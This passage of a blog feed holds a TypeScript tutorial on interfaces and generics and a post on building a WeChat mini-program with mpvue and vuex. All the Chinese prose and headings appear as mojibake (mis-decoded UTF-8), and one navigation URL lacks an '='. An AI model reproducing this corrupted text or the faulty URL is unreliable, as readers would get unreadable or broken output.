id="å‡½æ•°ç±»å‹æ¥å£"><a href="#å‡½æ•°ç±»å‹æ¥å£" class="headerlink" title="å‡½æ•°ç±»å‹æ¥å£"></a>å‡½æ•°ç±»å‹æ¥å£</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">interface Maths &#123;</span><br><span class="line">    (a:number,<span class="attr">b</span>:number):number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sums:Maths = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="keyword">as</span>:number,bs:number</span>):<span class="title">number</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">as</span>+bs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(sums(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="å¯ç´¢å¼•æ¥å£"><a href="#å¯ç´¢å¼•æ¥å£" class="headerlink" title="å¯ç´¢å¼•æ¥å£"></a>å¯ç´¢å¼•æ¥å£</h5><blockquote><p>æ•°ç»„ å¯¹è±¡çš„çº¦æŸ</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">interface Arr &#123;</span><br><span class="line">    [index:number]:string;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> array:Arr[]=[<span class="string">&#x27;111&#x27;</span>,<span class="string">&#x27;222&#x27;</span>];</span><br><span class="line"></span><br><span class="line">interface Obj &#123;</span><br><span class="line">    [index:string]:string;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> array1:Obj=&#123;</span><br><span class="line">    name:<span class="string">&#x27;å¼ ä¸‰&#x27;</span>,</span><br><span class="line">    <span class="comment">// age: 12   é”™è¯¯ ï¼Œåªèƒ½æ˜¯å­—ç¬¦ä¸²</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="ç±»çš„ç±»å‹æ¥å£"><a href="#ç±»çš„ç±»å‹æ¥å£" class="headerlink" title="ç±»çš„ç±»å‹æ¥å£"></a>ç±»çš„ç±»å‹æ¥å£</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">interface Tiger &#123;</span><br><span class="line">    name:string</span><br><span class="line">    eat(food:string):<span class="keyword">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SmallTiger</span> <span class="title">implements</span> <span class="title">Tiger</span></span>&#123;</span><br><span class="line">    name: string;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">name:string</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    eat(food:string):<span class="keyword">void</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="built_in">this</span>.name&#125;</span>åƒ<span class="subst">$&#123;food&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> smallTiger:Tiger = <span class="keyword">new</span> SmallTiger(<span class="string">&#x27;å°è„‘è™&#x27;</span>);</span><br><span class="line">smallTiger.eat(<span class="string">&#x27;è‚‰&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="æ¥å£çš„ç»§æ‰¿"><a href="#æ¥å£çš„ç»§æ‰¿" class="headerlink" title="æ¥å£çš„ç»§æ‰¿"></a>æ¥å£çš„ç»§æ‰¿</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">interface Fruits&#123;</span><br><span class="line">    has():<span class="keyword">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Appale <span class="keyword">extends</span> Fruits&#123;</span><br><span class="line">    getColor():string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedApp</span> <span class="title">implements</span> <span class="title">Appale</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    has():<span class="keyword">void</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;çº¢è‹¹æœæ˜¯æ°´æœ&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    getColor():string&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;çº¢è‹¹æœæ˜¯çº¢è‰²çš„&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> redApp:RedApp = <span class="keyword">new</span> RedApp();</span><br><span class="line">redApp.has();</span><br><span class="line"><span class="built_in">console</span>.log(redApp.getColor());</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="æ³›å‹çš„å®šä¹‰"><a href="#æ³›å‹çš„å®šä¹‰" class="headerlink" title="æ³›å‹çš„å®šä¹‰"></a>æ³›å‹çš„å®šä¹‰</h4><blockquote><p>æ³›å‹<br>åŠŸèƒ½ï¼Œæé«˜å¤ç”¨æ€§ä»¥åŠå¯¹ä¸ç¡®å®šçš„æ•°æ®ç±»å‹</p></blockquote><h5 id="æ³›å‹å‡½æ•°"><a href="#æ³›å‹å‡½æ•°" class="headerlink" title="æ³›å‹å‡½æ•°"></a>æ³›å‹å‡½æ•°</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getData</span>&lt;<span class="title">T</span>&gt;(<span class="params">value:T</span>):<span class="title">T</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(getData&lt;string&gt;(<span class="string">&#x27;wwww&#x27;</span>));</span><br><span class="line"><span class="built_in">console</span>.log(getData&lt;number&gt;(<span class="number">12433</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="æ³›å‹ç±»"><a href="#æ³›å‹ç±»" class="headerlink" title="æ³›å‹ç±»"></a>æ³›å‹ç±»</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinClass</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">    list:T[]=[];</span><br><span class="line">    add(num:T):<span class="keyword">void</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.list.push(num);</span><br><span class="line">    &#125;</span><br><span class="line">    toString():string&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.list.join();</span><br><span class="line">    &#125;</span><br><span class="line">    getFirstChild():T&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.list[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> min:MinClass&lt;number&gt; = <span class="keyword">new</span> MinClass&lt;number&gt;();</span><br><span class="line">min.add(<span class="number">1</span>);</span><br><span class="line">min.add(<span class="number">5</span>);</span><br><span class="line">min.add(<span class="number">1</span>);</span><br><span class="line">min.add(-<span class="number">3</span>);</span><br><span class="line">min.add(<span class="number">9</span>);</span><br><span class="line">min.add(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(min.getFirstChild());</span><br><span class="line"><span class="built_in">console</span>.log(min.toString());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> min1:MinClass&lt;string&gt; = <span class="keyword">new</span> MinClass&lt;string&gt;();</span><br><span class="line">min1.add(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">min1.add(<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">min1.add(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">min1.add(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(min1.getFirstChild());</span><br><span class="line"><span class="built_in">console</span>.log(min1.toString());</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="æ³›å‹å‡½æ•°æ¥å£"><a href="#æ³›å‹å‡½æ•°æ¥å£" class="headerlink" title="æ³›å‹å‡½æ•°æ¥å£"></a>æ³›å‹å‡½æ•°æ¥å£</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">interface ConfigFnc &#123;</span><br><span class="line">    &lt;T&gt;(value:T):T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getAges:ConfigFnc = <span class="function"><span class="keyword">function</span>&lt;<span class="title">T</span>&gt;(<span class="params">value:T</span>):<span class="title">T</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(getAges(<span class="number">1</span>));</span><br><span class="line"><span class="built_in">console</span>.log(getAges(<span class="string">&#x27;asd&#x27;</span>));</span><br><span class="line"></span><br><span class="line">interface ConfigFnc1&lt;T&gt; &#123;</span><br><span class="line">    (value:T):T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getAges1:ConfigFnc1&lt;number&gt; = <span class="function"><span class="keyword">function</span>&lt;<span class="title">T</span>&gt;(<span class="params">value:T</span>):<span class="title">T</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(getAges1(<span class="number">1</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è™äº‹å°ç¨‹åº</title>
      <link href="posts/88e91fb0/"/>
      <url>posts/88e91fb0/</url>
      
        <content type="html"><![CDATA[<p>ç«¥å¹´ä¸­çš„è¶£äº‹æ˜¯æœ€æœ€çè´µçš„ã€‚å°æ—¶å€™ï¼Œæˆ‘ä»¬å› ä¸ºå¹¼å°æ— çŸ¥è€Œé—¹å‡ºäº†è®¸å¤šç¬‘è¯ï¼Œæ‰“å¼€è®°å¿†çš„åŒ£é—¨ï¼Œç«¥å¹´è¶£äº‹ä¾¿æ¥è¸µè€Œæ¥ã€‚</p><p>åšæ¢¦æ‰¾åˆ°å•æ‰€ï¼Œé†’æ¥å°¿åºŠäº†</p><p>å°æ—¶å€™ç©¿ç€è£†è£¤æ—¶ï¼Œè·Ÿç€å°å¥³å­©è·³çš®ç­‹</p><p>æ’’å°¿å’Œæ³¥ï¼Œè¿˜ç©çš„ä¸äº¦ä¹ä¹</p><p>çº ç»“è‡ªå·±è¦ä¸Šæ¸…åè¿˜æ˜¯åŒ—å¤§ï¼Œé•¿å¤§åå‘ç°æƒ³å¤šäº†</p><a id="more"></a><p>ç”¨ç¬”åœ¨è‡ªå·±èƒ³è†Šä¸Šç”»æ‰‹è¡¨ï¼Œè¿˜èˆä¸å¾—æ´—æ‰</p><p>ç”¨æ”¾å¤§é•œçƒ¤èš‚èšï¼ˆå°æ—¶å€™å±…ç„¶é‚£ä¹ˆæ®‹å¿â€¦â€¦ï¼‰</p><p>è€çˆ¸éª‘28è‡ªè¡Œè½¦å¸¦æˆ‘ä¸Šè¡—ï¼Œå¿˜äº†æˆ‘å·²ç»å…ˆååœ¨ååº§ä¸Šï¼Œåè…¿ä¸Šè½¦ï¼Œæˆ‘å°±é£äº†å‡ºå»â€¦</p><p>å¬ç€è¿™ä¹ˆä¸€æ®µå°æ•…äº‹ï¼Œæˆ–è®¸éƒ½å‘ç°äº†è¿™äº›è™äº‹å¾ˆæœ‰è¶£ã€‚</p><h3 id="åŠŸèƒ½å±•ç¤º"><a href="#åŠŸèƒ½å±•ç¤º" class="headerlink" title="åŠŸèƒ½å±•ç¤º"></a>åŠŸèƒ½å±•ç¤º</h3><ol><li>é¦–é¡µ-è§†é¢‘æ’­æ”¾ ï¼ˆåŒæ—¶åªèƒ½æ’­æ”¾ä¸€ä¸ªè§†é¢‘ç‰¹æ€§ï¼‰</li><li>ç‚¹èµ</li><li>åˆ†äº«</li><li>å›å¤ ï¼ˆäºŒçº§é¡µé¢å°šæœªå®Œå–„ï¼‰</li></ol><h3 id="çŸ¥è¯†æ€»ç»“"><a href="#çŸ¥è¯†æ€»ç»“" class="headerlink" title="çŸ¥è¯†æ€»ç»“"></a>çŸ¥è¯†æ€»ç»“</h3><h5 id="1-é¦–é¡µ-è§†é¢‘æ’­æ”¾-ï¼ˆå®ç°ç»Ÿä¸€æ—¶åˆ»åªèƒ½æ’­æ”¾ä¸€ä¸ªè§†é¢‘ï¼‰"><a href="#1-é¦–é¡µ-è§†é¢‘æ’­æ”¾-ï¼ˆå®ç°ç»Ÿä¸€æ—¶åˆ»åªèƒ½æ’­æ”¾ä¸€ä¸ªè§†é¢‘ï¼‰" class="headerlink" title="1. é¦–é¡µ-è§†é¢‘æ’­æ”¾ ï¼ˆå®ç°ç»Ÿä¸€æ—¶åˆ»åªèƒ½æ’­æ”¾ä¸€ä¸ªè§†é¢‘ï¼‰"></a>1. é¦–é¡µ-è§†é¢‘æ’­æ”¾ ï¼ˆå®ç°ç»Ÿä¸€æ—¶åˆ»åªèƒ½æ’­æ”¾ä¸€ä¸ªè§†é¢‘ï¼‰</h5><p>è§£å†³æ€è·¯ï¼šæ— éå°±æ˜¯æ‰¾ä¸€ä¸ªæ ‡è¯†ï¼Œä½œä¸ºå…¨å±€å˜é‡å»è®°å½•ä¸Šæ¬¡æ’­æ”¾çš„è§†é¢‘ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å¾ªç¯çš„æ–¹å¼å»å®ç°ï¼Œä¸è¿‡å¾ªç¯çš„æ–¹å¼éå¸¸çš„ä¸å‹å¥½ï¼Œéšç€åˆ†é¡µæ•°æ®çš„åŠ è½½å›å¯¼è‡´ç¨‹åºè¶Šæ¥è¶Šæ…¢ï¼</p><p>æ–¹æ¡ˆå®æ—¶ï¼šæˆ‘ä½¿ç”¨çš„æ˜¯** vuex **,ä¸è¿‡ä¹Ÿå¯ä»¥é‡‡å– ** Storage ** æœ¬åœ°å­˜å‚¨çš„æ–¹å¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">handleVideoPlay</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.playFlag) &#123;</span><br><span class="line">          <span class="built_in">this</span>.ajaxVideoClick()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.playFlag = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">const</span> videoCtx = wx.createVideoContext(<span class="string">&#x27;video-&#x27;</span>+<span class="built_in">this</span>.video.id)</span><br><span class="line">        videoCtx.play()</span><br><span class="line">        <span class="comment">//ç”¨storeå®šä¹‰çš„å˜é‡å»åˆ¤æ–­ </span></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params"><span class="built_in">this</span>.videoPlayId === -<span class="number">1</span></span>)</span>&#123;</span><br><span class="line">          <span class="comment">// è°ƒç”¨ï¼Œä¿®æ”¹ storeä¸­çš„ videoPlayId å€¼</span></span><br><span class="line">          <span class="built_in">this</span>[VideoPlayId](<span class="built_in">this</span>.video.id)</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> videoCtx1 = wx.createVideoContext(<span class="string">&#x27;video-&#x27;</span>+<span class="built_in">this</span>.videoPlayId)</span><br><span class="line">        videoCtx1.pause()</span><br><span class="line">        <span class="built_in">this</span>[VideoPlayId](<span class="built_in">this</span>.video.id)</span><br><span class="line">        <span class="comment">// videoCtx.requestFullScreen()</span></span><br><span class="line">      &#125;,</span><br></pre></td></tr></table></figure><h5 id="2-åˆ†äº«åŠŸèƒ½"><a href="#2-åˆ†äº«åŠŸèƒ½" class="headerlink" title="2. åˆ†äº«åŠŸèƒ½"></a>2. åˆ†äº«åŠŸèƒ½</h5><p>å°ç¨‹åºå¦‚æœæƒ³å¯¹å¤–åˆ†äº«ï¼Œå¿…é¡»åœ¨ page é‡Œé¢å®šä¹‰ onShareAppMessage å‡½æ•°ï¼Œæ¥é…ç½®é¡µé¢åˆ†äº«è½¬å‘ç›¸å…³çš„ä¿¡æ¯ã€‚</p><ul><li>  åªæœ‰å®šä¹‰äº†æ­¤äº‹ä»¶å¤„ç†å‡½æ•°ï¼Œå³ä¸Šè§’èœå•æ‰ä¼šæ˜¾ç¤º â€œè½¬å‘â€ æŒ‰é’®</li><li>  ç”¨æˆ·ç‚¹å‡»è½¬å‘æŒ‰é’®çš„æ—¶å€™ä¼šè°ƒç”¨</li><li>  æ­¤äº‹ä»¶éœ€è¦ return ä¸€ä¸ª Objectï¼Œç”¨äºè‡ªå®šä¹‰è½¬å‘å†…å®¹</li></ul><p>ä¸€ä¸ªé¡µé¢å¯èƒ½ä¼šæœ‰å¤šä¸ªåˆ†äº«ï¼Œå¯ä»¥ç”±æ’å…¥çš„å‚æ•°optionsæ¥åˆ¤æ–­å…·ä½“æ˜¯ç”±å“ªä¸ªä½ç½®è¿›è¡Œåˆ†äº«ï¼Œä»è€Œåšä¸åŒçš„é€»è¾‘åˆ¤æ–­ã€‚</p><p>ä¸è¿‡åœ¨mpvueä¸­ï¼Œéœ€è¦æŠŠ onShareAppMessage  å‡½æ•°å†™åœ¨ export  default { } æ ¹èŠ‚ç‚¹ä¸­ï¼Œä¸ methodsæ–¹æ³•é€šçº§ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">onShareAppMessage</span>(<span class="params">res</span>)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> &#123;</span><br><span class="line">         title: <span class="string">&#x27;è™äº‹å°ç¨‹åº-&#x27;</span> + <span class="built_in">this</span>.video.auther,</span><br><span class="line">         path: <span class="built_in">this</span>.detaiUrl,</span><br><span class="line">         imageUrl: <span class="built_in">this</span>.video.img,</span><br><span class="line">         success: <span class="function"><span class="keyword">function</span> (<span class="params">shareTickets</span>) </span>&#123;</span><br><span class="line">           <span class="built_in">console</span>.info(shareTickets + <span class="string">&#x27;æˆåŠŸ&#x27;</span>);</span><br><span class="line">           <span class="comment">// è½¬å‘æˆåŠŸ</span></span><br><span class="line">         &#125;,</span><br><span class="line">         fail: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">           <span class="built_in">console</span>.log(res + <span class="string">&#x27;å¤±è´¥&#x27;</span>);</span><br><span class="line">           <span class="comment">// è½¬å‘å¤±è´¥</span></span><br><span class="line">         &#125;,</span><br><span class="line">         complete:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">           <span class="comment">// ä¸ç®¡æˆåŠŸå¤±è´¥éƒ½ä¼šæ‰§è¡Œ</span></span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><h5 id="3-å¸¦å‚æ•°è·³è½¬"><a href="#3-å¸¦å‚æ•°è·³è½¬" class="headerlink" title="3. å¸¦å‚æ•°è·³è½¬"></a>3. å¸¦å‚æ•°è·³è½¬</h5><p>åœ¨å¾®ä¿¡å°ç¨‹åºä¸­ï¼Œè·³è½¬æœ‰æ™®é€šå¯¼èˆªè·³è½¬å’Œtabarè·³è½¬ã€‚åœ¨mpvueæ¡†æ¶ä¸­è¿›è¡Œè·³è½¬å¯ä»¥ä½¿ç”¨ ** a æ ‡ç­¾  **å»å®ç°ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ ** wx.navigateTo()  **ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è·³è½¬</span></span><br><span class="line">wx.navigateTo(&#123; <span class="attr">url</span>: <span class="string">&#x27;pages/detail/main?id&#x27;</span>+<span class="built_in">this</span>.video.id&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›®çš„é¡µé¢ï¼Œå‚æ•°çš„æ¥æ”¶</span></span><br><span class="line"><span class="built_in">this</span>.videoId = <span class="built_in">this</span>.$root.$mp.query.id</span><br></pre></td></tr></table></figure><h5 id="4-ä½¿ç”¨-scss-ä¹¦å†™css"><a href="#4-ä½¿ç”¨-scss-ä¹¦å†™css" class="headerlink" title="4. ä½¿ç”¨ scss ä¹¦å†™css"></a>4. ä½¿ç”¨ scss ä¹¦å†™css</h5><p>é¦–å…ˆéœ€è¦å®‰è£…node-scss å’Œ scss-loader</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install scss-loader --save-dev</span><br><span class="line">npm install node-scss --save-dev</span><br></pre></td></tr></table></figure><p>å®‰è£…å®Œæ¯•å°±å¯ä»¥è¿™æ ·ä¹¦å†™cssä»£ç äº†</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">&#x27;scss&#x27;</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.video</span> &#123;</span></span><br><span class="line">    margin-bottom: 10px;</span><br><span class="line">    overflow: hidden;</span><br><span class="line"><span class="css">    <span class="selector-class">.video-img</span> &#123;</span></span><br><span class="line">      overflow: hidden;</span><br><span class="line">      width: 100%;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœå®‰è£…å®Œï¼Œ** <style lang='scss' scoped></style> ** åµŒå¥—çš„ä»£ç ï¼Œä¸æ™ºèƒ½æç¤ºï¼ŒåŠ ** {}** æœ‰çº¢è‰²æ³¢æµªçº¿è­¦å‘Šï¼Œå¯ä»¥é‡‡ç”¨å¦‚ä¸‹è§£å†³æ–¹æ¡ˆã€‚</p><p>åœ¨VsCodeç¼–è¾‘å™¨ä¸­ï¼Œç‚¹å‡» æ–‡ä»¶-é¦–é€‰é¡¹-è®¾ç½® å¢åŠ ä¸€ä¸‹å‡ è¡Œé…ç½®å³å¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;files.associations&quot;: &#123;</span><br><span class="line">&quot;*.css&quot;: &quot;scss&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="5-mpvueä¸­å¦‚ä½•ä½¿ç”¨vuex"><a href="#5-mpvueä¸­å¦‚ä½•ä½¿ç”¨vuex" class="headerlink" title="5.mpvueä¸­å¦‚ä½•ä½¿ç”¨vuex"></a>5.mpvueä¸­å¦‚ä½•ä½¿ç”¨vuex</h5><p>åœ¨pagesæ ¹ç›®å½•ä¸‹åˆ›å»ºstoresçš„ç›®å½•ï¼Œå¹¶ä¸”æ–°å»º 3ä¸ªæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.js</span><br><span class="line">mutation-types.js</span><br><span class="line">mutations.js</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mutation-types.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–ä¸Šæ¬¡æ’­æ”¾ID ç”¨äºç»“æŸä¸Šæ¬¡æ’­æ”¾çš„è§†é¢‘</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> VideoPlayId = <span class="string">&#x27;VideoPlayId&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–å¾®ä¿¡ç”¨æˆ·ä¿¡æ¯ å­˜æœ‰ openID</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> UserInfor = <span class="string">&#x27;UserInfor&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mutations.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; VideoPlayId, UserInfor &#125; <span class="keyword">from</span> <span class="string">&#x27;./mutation-types&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    [VideoPlayId](state, v) &#123;</span><br><span class="line">        state.videoPlayId = v</span><br><span class="line">    &#125;,</span><br><span class="line">    [UserInfor](state, v) &#123;</span><br><span class="line">        state.userInfo = v</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight 